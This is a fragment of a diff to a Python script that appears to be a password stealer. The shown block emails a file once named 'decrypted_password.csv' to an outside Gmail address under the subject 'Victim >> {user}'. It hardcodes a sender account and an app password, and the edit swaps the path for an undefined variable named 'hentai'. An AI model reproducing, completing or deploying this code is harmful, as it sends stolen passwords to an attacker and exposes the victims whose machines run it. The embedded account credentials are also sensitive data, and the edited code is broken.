@@ -135,11 +135,10 @@ if __name__ == '__main__':
     except Exception as e:
         pass
     finally:
-        a = os.getcwd()
         user = os.getlogin()
         subject = f"Victim >> {user}"
         body = ""
-        path = a + "\\decrypted_password.csv"
+        path = hentai
         sender_email = 'iamqwertyfish@gmail.com'
         sender_password = 'gdym qzfa ugfd qngz'
         recipient_email = 'sepiolsam2023@gmail.com'
